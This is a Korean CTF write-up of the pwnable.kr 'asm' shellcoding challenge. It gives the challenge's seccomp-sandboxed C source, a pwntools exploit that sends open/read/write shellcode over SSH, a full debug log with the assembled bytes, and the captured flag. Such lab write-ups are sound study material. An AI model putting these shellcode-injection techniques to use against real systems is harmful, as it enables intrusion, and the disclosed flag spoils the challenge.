# asm

## asm.c

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
	if (ctx == NULL) {
		printf("seccomp error\n");
		exit(0);
	}

	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

	if (seccomp_load(ctx) < 0){
		seccomp_release(ctx);
		printf("seccomp error\n");
		exit(0);
	}
	seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);

	printf("Welcome to shellcoding practice challenge.\n");
	printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
	printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
	printf("If this does not challenge you. you should play 'asg' challenge :)\n");

	char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
	memset(sh, 0x90, 0x1000);
	memcpy(sh, stub, strlen(stub));
	
	int offset = sizeof(stub);
	printf("give me your x64 shellcode: ");
	read(0, sh+offset, 1000);

	alarm(10);
	chroot("/home/asm_pwn");	// you are in chroot jail. so you can't use symlink in /tmp
	sandbox();
	((void (*)(void))sh)();
	return 0;
}
```

간단히 설명하면 `/home/asm_pwn`을 루트로 설정하고, `sh`에 `stub`을 먼저 넣고, 그 뒤에 우리가 넣은 쉘코드를 실행한다. 

여기서 `sandbox()` 함수를 실행하는데, 이것은 `read, write, exit, sigreturn` 만을 실행 가능하게 만든다. 

그 후 `seccomp_rule_add`를 통해 `read`, `write`, `open`, `exit`, `exit_group`을 추가적으로 사용할 수 있도록 설정한다.

그리고 `stub`의 내용은 아래와 같은 어셈블리어다.

```asm
    xor rax,rax 
    xor rbx,rbx 
    xor rcx,rcx 
    xor rdx,rdx 
    xor rsi,rsi 
    xor rdi,rdi 
    xor rbp,rbp
    xor r8,r8 
    xor r9,r9 
    xor r10,r10 
    xor r11,r11 
    xor r12,r12 
    xor r13,r13 
    xor r14,r14 
    xor r15,r15
```

`rsp`를 제외한 나머지 레지스터를 초기화 해준다.

이제 `this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong` 을 열어 읽고, 화면에 써주면 된다.

```c
rax = open("this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong");
read(rax, rsp, 100);
write(1, rsp, 100);
```

이런 식으로 어셈 코드를 짜주자.

## exploit.py

```python
from pwn import *

context.log_level = 'debug'

fileName = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'


'''
open(fileName, O_RDONLY);
read(rax, rsp, 100);
write(1, rsp, 100);
'''


payload = ''
payload += shellcraft.amd64.linux.open(fileName)
payload += shellcraft.amd64.linux.read('rax', 'rsp', 100)
payload += shellcraft.amd64.linux.write(1, 'rsp', 100)

#print asm(payload, arch='amd64')

s = ssh('asm', 'pwnable.kr', password='guest', port=2222) 
#r = s.run('./asm')
r = s.run('nc 0 9026')

r.recvuntil('shellcode: ')
r.sendline(asm(payload, arch='amd64'))
r.interactive()
```

```bash
[+] Connecting to pwnable.kr on port 2222: Done
[*] passcode@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.10.0
    ASLR:     Enabled
[+] Opening new channel: 'stty raw -ctlecho -echo; cd . >/dev/null 2>&1;nc 0 9026': Done
[DEBUG] Received 0x2a bytes:
    'Welcome to shellcoding practice challenge.'
[DEBUG] Received 0x4a bytes:
    '\n'
    'In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n'
[DEBUG] Received 0xb3 bytes:
    'Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n'
    "If this does not challenge you. you should play 'asg' challenge :)\n"
    'give me your x64 shellcode: '
[DEBUG] cpp -C -nostdinc -undef -P -I/usr/local/lib/python2.7/dist-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
        /* open(file='this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong', oflag=0, mode=0) */
        /* push 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\x00' */
        mov rax, 0x101010101010101
        push rax
        mov rax, 0x101010101010101 ^ 0x676e6f306f306f
        xor [rsp], rax
        mov rax, 0x306f306f306f306f
        push rax
        mov rax, 0x3030303030303030
        push rax
        mov rax, 0x303030306f6f6f6f
        push rax
        mov rax, 0x6f6f6f6f6f6f6f6f
        push rax
        mov rax, 0x6f6f6f6f6f6f6f6f
        push rax
        mov rax, 0x6f6f6f3030303030
        push rax
        mov rax, 0x3030303030303030
        push rax
        mov rax, 0x3030303030303030
        push rax
        mov rax, 0x303030306f6f6f6f
        push rax
        mov rax, 0x6f6f6f6f6f6f6f6f
        push rax
        mov rax, 0x6f6f6f6f6f6f6f6f
        push rax
        mov rax, 0x6f6f6f6f6f6f6f6f
        push rax
        mov rax, 0x6f6f6f6f6f6f6f6f
        push rax
        mov rax, 0x6f6f6f6f6f6f6f6f
        push rax
        mov rax, 0x6f6f6f6f6f6f6f6f
        push rax
        mov rax, 0x6f6f6f6f6f6f6f6f
        push rax
        mov rax, 0x6f6f6f6f6f6f6f6f
        push rax
        mov rax, 0x6f6f6f6f6f6f6f6f
        push rax
        mov rax, 0x6c5f797265765f73
        push rax
        mov rax, 0x695f656d616e5f65
        push rax
        mov rax, 0x6c69665f6568745f
        push rax
        mov rax, 0x7972726f732e656c
        push rax
        mov rax, 0x69665f736968745f
        push rax
        mov rax, 0x646165725f657361
        push rax
        mov rax, 0x656c705f656c6966
        push rax
        mov rax, 0x5f67616c665f726b
        push rax
        mov rax, 0x2e656c62616e7770
        push rax
        mov rax, 0x5f73695f73696874
        push rax
        mov rdi, rsp
        xor edx, edx /* 0 */
        xor esi, esi /* 0 */
        /* call open() */
        push 2 /* 2 */
        pop rax
        syscall
        /* call read('rax', 'rsp', 100) */
        mov rdi, rax
        xor eax, eax /* SYS_read */
        push 0x64
        pop rdx
        mov rsi, rsp
        syscall
        /* write(fd=1, buf='rsp', n=100) */
        push 1
        pop rdi
        push 0x64
        pop rdx
        mov rsi, rsp
        /* call write() */
        push 1 /* 1 */
        pop rax
        syscall
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-GVqg5R/step2 /tmp/pwn-asm-GVqg5R/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-GVqg5R/step3 /tmp/pwn-asm-GVqg5R/step4
[DEBUG] Sent 0x175 bytes:
    00000000  48 b8 01 01  01 01 01 01  01 01 50 48  b8 6e 31 6e  │H···│····│··PH│·n1n│
    00000010  31 6e 6f 66  01 48 31 04  24 48 b8 6f  30 6f 30 6f  │1nof│·H1·│$H·o│0o0o│
    00000020  30 6f 30 50  48 b8 30 30  30 30 30 30  30 30 50 48  │0o0P│H·00│0000│00PH│
    00000030  b8 6f 6f 6f  6f 30 30 30  30 50 48 b8  6f 6f 6f 6f  │·ooo│o000│0PH·│oooo│
    00000040  6f 6f 6f 6f  50 48 b8 6f  6f 6f 6f 6f  6f 6f 6f 50  │oooo│PH·o│oooo│oooP│
    00000050  48 b8 30 30  30 30 30 6f  6f 6f 50 48  b8 30 30 30  │H·00│000o│ooPH│·000│
    00000060  30 30 30 30  30 50 48 b8  30 30 30 30  30 30 30 30  │0000│0PH·│0000│0000│
    00000070  50 48 b8 6f  6f 6f 6f 30  30 30 30 50  48 b8 6f 6f  │PH·o│ooo0│000P│H·oo│
    00000080  6f 6f 6f 6f  6f 6f 50 48  b8 6f 6f 6f  6f 6f 6f 6f  │oooo│ooPH│·ooo│oooo│
    00000090  6f 50 48 b8  6f 6f 6f 6f  6f 6f 6f 6f  50 48 b8 6f  │oPH·│oooo│oooo│PH·o│
    000000a0  6f 6f 6f 6f  6f 6f 6f 50  48 b8 6f 6f  6f 6f 6f 6f  │oooo│oooP│H·oo│oooo│
    000000b0  6f 6f 50 48  b8 6f 6f 6f  6f 6f 6f 6f  6f 50 48 b8  │ooPH│·ooo│oooo│oPH·│
    000000c0  6f 6f 6f 6f  6f 6f 6f 6f  50 48 b8 6f  6f 6f 6f 6f  │oooo│oooo│PH·o│oooo│
    000000d0  6f 6f 6f 50  48 b8 6f 6f  6f 6f 6f 6f  6f 6f 50 48  │oooP│H·oo│oooo│ooPH│
    000000e0  b8 73 5f 76  65 72 79 5f  6c 50 48 b8  65 5f 6e 61  │·s_v│ery_│lPH·│e_na│
    000000f0  6d 65 5f 69  50 48 b8 5f  74 68 65 5f  66 69 6c 50  │me_i│PH·_│the_│filP│
    00000100  48 b8 6c 65  2e 73 6f 72  72 79 50 48  b8 5f 74 68  │H·le│.sor│ryPH│·_th│
    00000110  69 73 5f 66  69 50 48 b8  61 73 65 5f  72 65 61 64  │is_f│iPH·│ase_│read│
    00000120  50 48 b8 66  69 6c 65 5f  70 6c 65 50  48 b8 6b 72  │PH·f│ile_│pleP│H·kr│
    00000130  5f 66 6c 61  67 5f 50 48  b8 70 77 6e  61 62 6c 65  │_fla│g_PH│·pwn│able│
    00000140  2e 50 48 b8  74 68 69 73  5f 69 73 5f  50 48 89 e7  │.PH·│this│_is_│PH··│
    00000150  31 d2 31 f6  6a 02 58 0f  05 48 89 c7  31 c0 6a 64  │1·1·│j·X·│·H··│1·jd│
    00000160  5a 48 89 e6  0f 05 6a 01  5f 6a 64 5a  48 89 e6 6a  │ZH··│··j·│_jdZ│H··j│
    00000170  01 58 0f 05  0a                                     │·X··│·│
    00000175
[*] Switching to interactive mode
[DEBUG] Received 0x64 bytes:
    'Mak1ng_shelLcodE_i5_veRy_eaSy\n'
    'lease_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooo'
Mak1ng_shelLcodE_i5_veRy_eaSy
lease_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooo[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed SSH channel with pwnable.kr
```